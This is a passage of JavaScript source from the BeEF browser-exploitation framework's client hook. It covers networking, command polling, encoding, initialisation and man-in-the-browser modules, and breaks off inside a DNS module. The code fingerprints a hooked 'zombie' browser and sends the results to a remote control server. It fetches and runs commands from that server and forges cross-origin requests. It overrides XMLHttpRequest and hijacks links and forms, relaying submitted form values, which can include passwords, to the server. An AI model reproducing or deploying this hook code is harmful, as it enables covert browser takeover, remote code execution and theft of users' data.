     * Using sync mode, request obj fields will be populated.
     */
    response: function () {
        this.status_code = null;        // 500, 404, 200, 302
        this.status_text = null;        // success, timeout, error, ...
        this.response_body = null;      // "<html>â€¦." if not a cross-origin request
        this.port_status = null;        // tcp port is open, closed or not http
        this.was_cross_domain = null;   // true or false
        this.was_timedout = null;       // the user specified timeout was reached
        this.duration = null;           // how long it took for the request to complete
        this.headers = null;            // full response headers
    },

    /**
     * Queues the specified command results.
     * @param: {String} handler: the server-side handler that will be called
     * @param: {Integer} cid: command id
     * @param: {String} results: the data to send
     * @param: {Integer} status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
     * @param: {Function} callback: the function to call after execution
     */
    queue: function (handler, cid, results, status, callback) {
        if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
            var s = new beef.net.command();
            s.cid = cid;
            s.results = beef.net.clean(results);
            s.status = status;
            s.callback = callback;
            s.handler = handler;
            this.cmd_queue.push(s);
        }
    },

    /**
     * Queues the current command results and flushes the queue straight away.
     * NOTE: Always send Browser Fingerprinting results
     * (beef.net.browser_details(); -> /init handler) using normal XHR-polling,
     * even if WebSockets are enabled.
     * @param: {String} handler: the server-side handler that will be called
     * @param: {Integer} cid: command id
     * @param: {String} results: the data to send
     * @param: {Integer} exec_status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
     * @param: {Function} callback: the function to call after execution
     * @return: {Integer} exec_status: the command module execution status (defaults to 0 - 'unknown' if status is null)
     */
    send: function (handler, cid, results, exec_status, callback) {
        // defaults to 'unknown' execution status if no parameter is provided, otherwise set the status
        var status = 0;
        if (exec_status != null && parseInt(Number(exec_status)) == exec_status){ status = exec_status}

        if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
            this.queue(handler, cid, results, status, callback);
            this.flush();
        } else {
            try {
                beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
                    '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
                    '", "status": "' + exec_status +
                    '", "callback": "' + callback +
                    '","bh":"' + beef.session.get_hook_session_id() + '" }');
            } catch (e) {
                this.queue(handler, cid, results, status, callback);
                this.flush();
            }
        }

        return status;
    },

    /**
     * Flush all currently queued command results to the framework,
     * chopping the data in chunks ('chunk' method) which will be re-assembled
     * server-side by the network stack.
     * NOTE: currently 'flush' is used only with the default
     * XHR-polling mechanism. If WebSockets are used, the data is sent
     * back to BeEF straight away.
     */
    flush: function () {
        if (this.cmd_queue.length > 0) {
            var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
            this.cmd_queue.length = 0;
            this.sid_count++;
            var stream = new this.stream();
            stream.id = this.sid_count;
            var pad = stream.get_base_url_length() + this.pad;
            //cant continue if chop amount is too low
            if ((this.chop - pad) > 0) {
                var data = this.chunk(data, (this.chop - pad));
                for (var i = 1; i <= data.length; i++) {
                    var packet = new this.packet();
                    packet.id = i;
                    packet.data = data[(i - 1)];
                    stream.packets.push(packet);
                }
                stream.pc = stream.packets.length;
                this.push(stream);
            }
        }
    },

    /**
     * Split the input data into chunk lengths determined by the amount parameter.
     * @param: {String} str: the input data
     * @param: {Integer} amount: chunk length
     */
    chunk: function (str, amount) {
        if (typeof amount == 'undefined') n = 2;
        return str.match(RegExp('.{1,' + amount + '}', 'g'));
    },

    /**
     * Push the input stream back to the BeEF server-side components.
     * It uses beef.net.request to send back the data.
     * @param: {Object} stream: the stream object to be sent back.
     */
    push: function (stream) {
        //need to implement wait feature here eventually
        for (var i = 0; i < stream.pc; i++) {
            this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
        }
    },

    /**
     * Performs http requests
     * @param: {String} scheme: HTTP or HTTPS
     * @param: {String} method: GET or POST
     * @param: {String} domain: bindshell.net, 192.168.3.4, etc
     * @param: {Int} port: 80, 5900, etc
     * @param: {String} path: /path/to/resource
     * @param: {String} anchor: this is the value that comes after the # in the URL
     * @param: {String} data: This will be used as the query string for a GET or post data for a POST
     * @param: {Int} timeout: timeout the request after N seconds
     * @param: {String} dataType: specify the data return type expected (ie text/html/script)
     * @param: {Function} callback: call the callback function at the completion of the method
     *
     * @return: {Object} response: this object contains the response details
     */
    request: function (scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
        //check if same domain or cross domain
        var cross_domain = true;
        if (document.domain == domain.replace(/(\r\n|\n|\r)/gm, "")) { //strip eventual line breaks
            if (document.location.port == "" || document.location.port == null) {
                cross_domain = !(port == "80" || port == "443");
            }
        }

        //build the url
        var url = "";
        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
            url = path;
        } else {
            url = scheme + "://" + domain;
            url = (port != null) ? url + ":" + port : url;
            url = (path != null) ? url + path : url;
            url = (anchor != null) ? url + "#" + anchor : url;
        }

        //define response object
        var response = new this.response;
        response.was_cross_domain = cross_domain;
        var start_time = new Date().getTime();

        /*
         * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
         * This will turn POSTs into GETs for remote-domain requests.
         */
        if (method == "POST") {
            $j.ajaxSetup({
                dataType: dataType
            });
        } else {
            $j.ajaxSetup({
                dataType: 'script'
            });
        }

        //build and execute the request
        $j.ajax({type: method,
            url: url,
            data: data,
            timeout: (timeout * 1000),

            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
            beforeSend: function (xhr) {
                if (method == "POST") {
                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                }
            },
            success: function (data, textStatus, xhr) {
                var end_time = new Date().getTime();
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.response_body = data;
                response.port_status = "open";
                response.was_timedout = false;
                response.duration = (end_time - start_time);
            },
            error: function (jqXHR, textStatus, errorThrown) {
                var end_time = new Date().getTime();
                response.response_body = jqXHR.responseText;
                response.status_code = jqXHR.status;
                response.status_text = textStatus;
                response.duration = (end_time - start_time);
                response.port_status = "open";
            },
            complete: function (jqXHR, textStatus) {
                response.status_code = jqXHR.status;
                response.status_text = textStatus;
                response.headers = jqXHR.getAllResponseHeaders();
                // determine if TCP port is open/closed/not-http
                if (textStatus == "timeout") {
                    response.was_timedout = true;
                    response.response_body = "ERROR: Timed out\n";
                    response.port_status = "closed";
                } else if (textStatus == "parsererror") {
                    response.port_status = "not-http";
                } else {
                    response.port_status = "open";
                }
            }
        }).always(function () {
                if (callback != null) {
                    callback(response);
                }
            });
        return response;
    },

    /*
     * Similar to beef.net.request, except from a few things that are needed when dealing with forged requests:
     *  - requestid: needed on the callback
     *  - allowCrossDomain: set cross-domain requests as allowed or blocked
     *
     * forge_request is used mainly by the Requester and Tunneling Proxy Extensions.
     * Example usage:
     * beef.net.forge_request("http", "POST", "172.20.40.50", 8080, "/lulz",
     *   true, null, { foo: "bar" }, 5, 'html', false, null, function(response) {
     *   alert(response.response_body)})
     */
    forge_request: function (scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {

        // check if same domain or cross domain
        var cross_domain = true;
        if (domain == "undefined" || path == "undefined") {
            return;
        }
        if (document.domain == domain.replace(/(\r\n|\n|\r)/gm, "")) { //strip eventual line breaks
            if (document.location.port == "" || document.location.port == null) {
                cross_domain = !(port == "80" || port == "443");
            } else {
                if (document.location.port == port) cross_domain = false;
            }
        }
        // build the url
        var url = "";
        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
            url = path;
        } else {
            url = scheme + "://" + domain;
            url = (port != null) ? url + ":" + port : url;
            url = (path != null) ? url + path : url;
            url = (anchor != null) ? url + "#" + anchor : url;
        }

        // define response object
        var response = new this.response;
        response.was_cross_domain = cross_domain;
        var start_time = new Date().getTime();

        // if cross-domain requests are not allowed and the request is cross-domain
        // don't proceed and return
        if (allowCrossDomain == "false" && cross_domain && callback != null) {
            response.status_code = -1;
            response.status_text = "crossdomain";
            response.port_status = "crossdomain";
            response.response_body = "ERROR: Cross Domain Request. The request was not sent.\n";
            response.headers = "ERROR: Cross Domain Request. The request was not sent.\n";
            callback(response, requestid);
            return response;
        }

        /*
         * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
         * This will turn POSTs into GETs for remote-domain requests.
         */
        if (method == "POST") {
            $j.ajaxSetup({
                dataType: dataType
            });
        } else {
            $j.ajaxSetup({
                dataType: 'script'
            });
        }

        // this is required for bugs in IE so data can be transferred back to the server
        if (beef.browser.isIE()) {
            dataType = 'script'
        }

        $j.ajax({type: method,
            dataType: dataType,
            url: url,
            headers: headers,
            timeout: (timeout * 1000),

            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
            beforeSend: function (xhr) {
                if (method == "POST") {
                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                }
            },

            data: data,

            // http server responded successfully
            success: function (data, textStatus, xhr) {
                var end_time = new Date().getTime();
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.response_body = data;
                response.was_timedout = false;
                response.duration = (end_time - start_time);
            },

            // server responded with a http error (403, 404, 500, etc)
            // or server is not a http server
            error: function (xhr, textStatus, errorThrown) {
                var end_time = new Date().getTime();
                response.response_body = xhr.responseText;
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.duration = (end_time - start_time);
            },

            complete: function (xhr, textStatus) {
                // cross-domain request
                if (cross_domain) {

                    response.port_status = "crossdomain";

                    if (xhr.status != 0) {
                        response.status_code = xhr.status;
                    } else {
                        response.status_code = -1;
                    }

                    if (textStatus) {
                        response.status_text = textStatus;
                    } else {
                        response.status_text = "crossdomain";
                    }

                    if (xhr.getAllResponseHeaders()) {
                        response.headers = xhr.getAllResponseHeaders();
                    } else {
                        response.headers = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
                    }

                    if (!response.response_body) {
                        response.response_body = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
                    }

                } else {
                    // same-domain request
                    response.status_code = xhr.status;
                    response.status_text = textStatus;
                    response.headers = xhr.getAllResponseHeaders();

                    // determine if TCP port is open/closed/not-http
                    if (textStatus == "timeout") {
                        response.was_timedout = true;
                        response.response_body = "ERROR: Timed out\n";
                        response.port_status = "closed";
                        /*
                         * With IE we need to explicitly set the dataType to "script",
                         * so there will be always parse-errors if the content is != javascript
                         * */
                    } else if (textStatus == "parsererror") {
                        response.port_status = "not-http";
                        if (beef.browser.isIE()) {
                            response.status_text = "success";
                            response.port_status = "open";
                        }
                    } else {
                        response.port_status = "open";
                    }
                }
                callback(response, requestid);
            }
        });
        return response;
    },

    //this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
    //http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
    clean: function (r) {
        if (this.array_has_string_key(r)) {
            var obj = {};
            for (var key in r)
                obj[key] = (this.array_has_string_key(obj[key])) ? this.clean(r[key]) : r[key];
            return obj;
        }
        return r;
    },

    //Detects if an array has a string key
    array_has_string_key: function (arr) {
        if ($j.isArray(arr)) {
            try {
                for (var key in arr)
                    if (isNaN(parseInt(key))) return true;
            } catch (e) {
            }
        }
        return false;
    },

    /**
     * Sends back browser details to framework, calling beef.browser.getDetails()
     */
    browser_details: function () {
        var details = beef.browser.getDetails();
        details['HookSessionID'] = beef.session.get_hook_session_id();
        this.send('/init', 0, details);
    }

};


beef.regCmp('beef.net');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @Literal object: beef.updater
 *
 * Object in charge of getting new commands from the BeEF framework and execute them.
 * The XHR-polling channel is managed here. If WebSockets are enabled,
 * websocket.ls is used instead.
 */
beef.updater = {
	
	// XHR-polling timeout.
    xhr_poll_timeout: "1000",
    beefhook: "BEEFHOOK",
	
	// A lock.
	lock: false,
	
	// An object containing all values to be registered and sent by the updater.
	objects: new Object(),
	
	/*
	 * Registers an object to always send when requesting new commands to the framework.
	 * @param: {String} the name of the object.
	 * @param: {String} the value of that object.
	 * 
	 * @example: beef.updater.regObject('java_enabled', 'true');
	 */
	regObject: function(key, value) {
		this.objects[key] = escape(value);
	},
	
	// Checks for new commands from the framework and runs them.
	check: function() {
		if(this.lock == false) {
			if (beef.logger.running) {
				beef.logger.queue();
			}
			beef.net.flush();
			if(beef.commands.length > 0) {
				this.execute_commands();
			}else {
				this.get_commands();    /*Polling*/
			}
		}
        /* The following gives a stupid syntax error in IE, which can be ignored*/
        setTimeout(function(){beef.updater.check()}, beef.updater.xhr_poll_timeout);
	},
	
    /**
     * Gets new commands from the framework.
     */
	get_commands: function() {
		try {
			this.lock = true;
            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, beef.updater.beefhook+'='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
                if (response.body != null && response.body.length > 0)
                    beef.updater.execute_commands();
            });
		} catch(e) {
			this.lock = false;
			return;
		}
		this.lock = false;
	},
	
    /**
     * Executes the received commands, if any.
     */
	execute_commands: function() {
		if(beef.commands.length == 0) return;
		this.lock = true;
		while(beef.commands.length > 0) {
			command = beef.commands.pop();
			try {
				command();
			} catch(e) {
				beef.debug('execute_commands - command failed to execute: ' + e.message);
                // prints the command source to be executed, to better trace errors
                // beef.client_debug must be enabled in the main config
                beef.debug(command.toString());
			}
		}
		this.lock = false;
	}
};

beef.regCmp('beef.updater');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Base64 code from http://stackoverflow.com/questions/3774622/how-to-base64-encode-inside-of-javascript/3774662#3774662

beef.encode = {};

beef.encode.base64 = {
	
	keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

    encode : function (input) {
        if (window.btoa) {
           return btoa(unescape(encodeURIComponent(input)));
        }

        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;

        input = beef.encode.base64.utf8_encode(input);

        while (i < input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output +
            this.keyStr.charAt(enc1) + this.keyStr.charAt(enc2) +
            this.keyStr.charAt(enc3) + this.keyStr.charAt(enc4);

        }

        return output;
    },


    decode : function (input) {
        if (window.atob) {
            return escape(atob(input));
        }

        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

        while (i < input.length) {

            enc1 = this.keyStr.indexOf(input.charAt(i++));
            enc2 = this.keyStr.indexOf(input.charAt(i++));
            enc3 = this.keyStr.indexOf(input.charAt(i++));
            enc4 = this.keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }

        }

        output = beef.encode.base64.utf8_decode(output);

        return output;

    },


   utf8_encode : function (string) {
        string = string.replace(/\r\n/g,"\n");
        var utftext = "";

        for (var n = 0; n < string.length; n++) {

            var c = string.charCodeAt(n);

            if (c < 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }

        return utftext;
    },

    utf8_decode : function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;

        while ( i < utftext.length ) {

            c = utftext.charCodeAt(i);

            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }

        }

        return string;
    }

};

beef.regCmp('beef.encode.base64');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Json code from Brantlye Harris-- http://code.google.com/p/jquery-json/

beef.encode.json = {
	
	stringify: function(o) {
        if (typeof(JSON) == 'object' && JSON.stringify) {
            // Error on stringifying cylcic structures caused polling to die
            try {
                s = JSON.stringify(o);    
            } catch(error) {
                // TODO log error / handle cyclic structures? 
            }
            return s;
        }
        var type = typeof(o);
    
        if (o === null)
            return "null";
    
        if (type == "undefined")
            return '\"\"';
        
        if (type == "number" || type == "boolean")
            return o + "";
    
        if (type == "string")
            return $j.quoteString(o);
    
        if (type == 'object')
        {
            if (typeof o.toJSON == "function") 
                return $j.toJSON( o.toJSON() );
            
            if (o.constructor === Date)
            {
                var month = o.getUTCMonth() + 1;
                if (month < 10) month = '0' + month;

                var day = o.getUTCDate();
                if (day < 10) day = '0' + day;

                var year = o.getUTCFullYear();
                
                var hours = o.getUTCHours();
                if (hours < 10) hours = '0' + hours;
                
                var minutes = o.getUTCMinutes();
                if (minutes < 10) minutes = '0' + minutes;
                
                var seconds = o.getUTCSeconds();
                if (seconds < 10) seconds = '0' + seconds;
                
                var milli = o.getUTCMilliseconds();
                if (milli < 100) milli = '0' + milli;
                if (milli < 10) milli = '0' + milli;

                return '"' + year + '-' + month + '-' + day + 'T' +
                             hours + ':' + minutes + ':' + seconds + 
                             '.' + milli + 'Z"'; 
            }

            if (o.constructor === Array) 
            {
                var ret = [];
                for (var i = 0; i < o.length; i++)
                    ret.push( $j.toJSON(o[i]) || "null" );

                return "[" + ret.join(",") + "]";
            }
        
            var pairs = [];
            for (var k in o) {
                var name;
                var type = typeof k;

                if (type == "number")
                    name = '"' + k + '"';
                else if (type == "string")
                    name = $j.quoteString(k);
                else
                    continue;  //skip non-string or number keys
            
                if (typeof o[k] == "function") 
                    continue;  //skip pairs where the value is a function.
            
                var val = $j.toJSON(o[k]);
            
                pairs.push(name + ":" + val);
            }

            return "{" + pairs.join(", ") + "}";
        }
    },

    quoteString: function(string) {
        if (string.match(this._escapeable))
        {
            return '"' + string.replace(this._escapeable, function (a) 
            {
                var c = this._meta[a];
                if (typeof c === 'string') return c;
                c = a.charCodeAt();
                return '\\u00' + Math.floor(c / 16).toString(16) + (c % 16).toString(16);
            }) + '"';
        }
        return '"' + string + '"';
    },
    
    _escapeable: /["\\\x00-\x1f\x7f-\x9f]/g,
    
    _meta : {
        '\b': '\\b',
        '\t': '\\t',
        '\n': '\\n',
        '\f': '\\f',
        '\r': '\\r',
        '"' : '\\"',
        '\\': '\\\\'
    }
};

$j.toJSON = function(o) {return beef.encode.json.stringify(o);};
$j.quoteString = function(o) {return beef.encode.json.quoteString(o);};

beef.regCmp('beef.encode.json');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.local
 * 
 * Provides networking functions for the local/internal network of the zombie.
 */
beef.net.local = {
	
	sock: false,
	checkJava: false,
	hasJava: false,
	
	/**
	 * Initializes the java socket. We have to use this method because
	 * some browsers do not have java installed or it is not accessible.
	 * in which case creating a socket directly generates an error. So this code
	 * is invalid:
	 * sock: new java.net.Socket();
	 */

	initializeSocket: function() {
		if(this.checkJava){	
			if(!beef.browser.hasJava()) {
				this.checkJava=True;
				this.hasJava=False;
				return -1;
			}else{
				this.checkJava=True;
				this.hasJava=True;
				return 1;
			}
		}
		else{
			if(!this.hasJava) return -1;
			else{	
				try {
					this.sock = new java.net.Socket();
				} catch(e) {
					return -1;
				}
				return 1;
			}
		}
	},
	
	/**
	 * Returns the internal IP address of the zombie.
	 * @return: {String} the internal ip of the zombie.
	 * @error: return -1 if the internal ip cannot be retrieved.
	 */
	getLocalAddress: function() {
		if(!this.hasJava) return false;
		
		this.initializeSocket();
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			
			return this.sock.getLocalAddress().getHostAddress();
		} catch(e) { return false; }
	},
	
	/**
	 * Returns the internal hostname of the zombie.
	 * @return: {String} the internal hostname of the zombie.
	 * @error: return -1 if the hostname cannot be retrieved.
	 */
	getLocalHostname: function() {
		if(!this.hasJava) return false;
		
		this.initializeSocket();
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			
			return this.sock.getLocalAddress().getHostName();
		} catch(e) { return false; }
	}
	
};

beef.regCmp('beef.net.local');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * @literal object: beef.init
 * Contains the beef_init() method which starts the BeEF client-side
 * logic. Also, it overrides the 'onpopstate' and 'onclose' events on the windows object.
 *
 * If beef.pageIsLoaded is true, then this JS has been loaded >1 times
 * and will have a new session id. The new session id will need to know
 * the brwoser details. So sendback the browser details again.
 */

beef.session.get_hook_session_id();

if (beef.pageIsLoaded) {
    beef.net.browser_details();
}

window.onload = function () {
    beef_init();
};

window.onpopstate = function (event) {
    if (beef.onpopstate.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onpopstate.length; i++) {
            var callback = beef.onpopstate[i];
            try {
                callback(event);
            } catch (e) {
                beef.debug("window.onpopstate - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};

window.onclose = function (event) {
    if (beef.onclose.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onclose.length; i++) {
            var callback = beef.onclose[i];
            try {
                callback(event);
            } catch (e) {
                beef.debug("window.onclose - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};

/**
 * Starts the polling mechanism, and initialize various components:
 *  - browser details (see browser.js) are sent back to the "/init" handler
 *  - the polling starts (checks for new commands, and execute them)
 *  - the logger component is initialized (see logger.js)
 *  - the Autorun Engine is initialized (see are.js)
 */
function beef_init() {
    if (!beef.pageIsLoaded) {
        beef.pageIsLoaded = true;
        if (beef.browser.hasWebSocket() && typeof beef.websocket != 'undefined') {
            beef.websocket.start();
            beef.net.browser_details();
            beef.updater.execute_commands();
            beef.logger.start();
        }else {
            beef.net.browser_details();
            beef.updater.execute_commands();
            beef.updater.check();
            beef.logger.start();
        }
    }
}


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


beef.mitb = {

    cid:null,
    curl:null,

    init:function (cid, curl) {
        beef.mitb.cid = cid;
        beef.mitb.curl = curl;
        /*Override open method to intercept ajax request*/
        var hook_file = "/hook.js";

        if (window.XMLHttpRequest && !(window.ActiveXObject)) {

            beef.mitb.sniff("Method XMLHttpRequest.open override");
            (function (open) {
                XMLHttpRequest.prototype.open = function (method, url, async, mitb_call) {
                    // Ignore it and don't hijack it. It's either a request to BeEF (hook file or Dynamic Handler)
                    // or a request initiated by the MiTB itself.
                    if (mitb_call || (url.indexOf(hook_file) != -1 || url.indexOf("/dh?") != -1)) {
                        open.call(this, method, url, async, true);
                    }else {
                        var portRegex = new RegExp(":[0-9]+");
                        var portR = portRegex.exec(url);
                        var requestPort;
                        if (portR != null) { requestPort = portR[0].split(":")[1]; }

                        //GET request
                        if (method == "GET") {
                            //GET request -> cross-origin
                            if (url.indexOf(document.location.hostname) == -1 || (portR != null && requestPort != document.location.port )) {
                                beef.mitb.sniff("GET [Ajax CrossDomain Request]: " + url);
                                window.open(url);
                            }else { //GET request -> same-origin
                                beef.mitb.sniff("GET [Ajax Request]: " + url);
                                if (beef.mitb.fetch(url, document.getElementsByTagName("html")[0])) {
                                    var title = "";
                                    if (document.getElementsByTagName("title").length == 0) {
                                        title = document.title;
                                    } else {
                                        title = document.getElementsByTagName("title")[0].innerHTML;
                                    }
                                    // write the url of the page
                                    history.pushState({ Be:"EF" }, title, url);
                                }
                            }
                        }else{
                            //POST request
                            beef.mitb.sniff("POST ajax request to: " + url);
                            open.call(this, method, url, async, true);
                        }
                    }
                };
            })(XMLHttpRequest.prototype.open);
        }
    },

    // Initializes the hook on anchors and forms.
    hook:function () {
        beef.onpopstate.push(function (event) {
            beef.mitb.fetch(document.location, document.getElementsByTagName("html")[0]);
        });
        beef.onclose.push(function (event) {
            beef.mitb.endSession();
        });

        var anchors = document.getElementsByTagName("a");
        var forms = document.getElementsByTagName("form");
        var lis = document.getElementsByTagName("li");

        for (var i = 0; i < anchors.length; i++) {
            anchors[i].onclick = beef.mitb.poisonAnchor;
        }
        for (var i = 0; i < forms.length; i++) {
            beef.mitb.poisonForm(forms[i]);
        }

        for (var i = 0; i < lis.length; i++) {
            if (lis[i].hasAttribute("onclick")) {
                lis[i].removeAttribute("onclick");
                /*clear*/
                lis[i].setAttribute("onclick", "beef.mitb.fetchOnclick('" + lis[i].getElementsByTagName("a")[0] + "')");
                /*override*/

            }
        }
    },

    // Hooks anchors and prevents them from linking away
    poisonAnchor:function (e) {
        try {
            e.preventDefault;
            if (beef.mitb.fetch(e.currentTarget, document.getElementsByTagName("html")[0])) {
                var title = "";
                if (document.getElementsByTagName("title").length == 0) {
                    title = document.title;
                } else {
                    title = document.getElementsByTagName("title")[0].innerHTML;
                }
                history.pushState({ Be:"EF" }, title, e.currentTarget);
            }
        } catch (e) {
            beef.debug('beef.mitb.poisonAnchor - failed to execute: ' + e.message);
        }
        return false;
    },

    // Hooks forms and prevents them from linking away
    poisonForm:function (form) {
        form.onsubmit = function (e) {
            var inputs = form.getElementsByTagName("input");
            var query = "";
            for (var i = 0; i < inputs.length; i++) {
                if (i > 0 && i < inputs.length - 1) query += "&";
                switch (inputs[i].type) {
                    case "submit":
                        break;
                    default:
                        query += inputs[i].name + "=" + inputs[i].value;
                        break;
                }
            }
            e.preventdefault;
            beef.mitb.fetchForm(form.action, query, document.getElementsByTagName("html")[0]);
            history.pushState({ Be:"EF" }, "", form.action);
            return false;
        }
    },

    // Fetches a hooked form with AJAX
    fetchForm:function (url, query, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('POST', url, false, true);
            y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            };
            y.send(query);
            beef.mitb.sniff("POST: " + url + "[" + query + "]");
            return true;
        } catch (x) {
            return false;
        }
    },

    // Fetches a hooked link with AJAX
    fetch:function (url, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            };
            y.send(null);
            beef.mitb.sniff("GET: " + url);
            return true;
        } catch (x) {
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
            return false;
        }
    },

    // Fetches a window.location=http://domainname.com and setting up history
    fetchOnclick:function (url) {
        try {
            var target = document.getElementsByTagName("html")[0];
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    var title = "";
                    if (document.getElementsByTagName("title").length == 0) {
                        title = document.title;
                    }
                    else {
                        title = document.getElementsByTagName("title")[0].innerHTML;
                        }
                    history.pushState({ Be:"EF" }, title, url);
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            };
            y.send(null);
            beef.mitb.sniff("GET: " + url);

        } catch (x) {
            // the link is cross-origin, so load the resource in a different tab
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
        }
    },

    // Relays an entry to the framework
    sniff:function (result) {
        try {
            beef.net.send(beef.mitb.cid, beef.mitb.curl, result);
        } catch (x) {
        }
        return true;
    },

    // Signals the Framework that the user has lost the hook
    endSession:function () {
        beef.mitb.sniff("Window closed.");
    }
};

beef.regCmp('beef.mitb');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.dns
 * 
 * request object structure:
 * + msgId: {Integer} Unique message ID for the request.
 * + domain: {String} Remote domain to retrieve the data.
 * + wait: {Integer} Wait time between requests (milliseconds) - NOT IMPLEMENTED
 * + callback: {Function} Callback function to receive the number of requests sent.
 */

beef.net.dns = {

	handler: "dns",

	send: function(msgId, data, domain, callback) {

        var encode_data = function(str) {
            var result="";
            for(i=0;i<str.length;++i) {
                result+=str.charCodeAt(i).toString(16).toUpperCase();
            }
            return result;
        };

        var encodedData = encodeURI(encode_data(data));

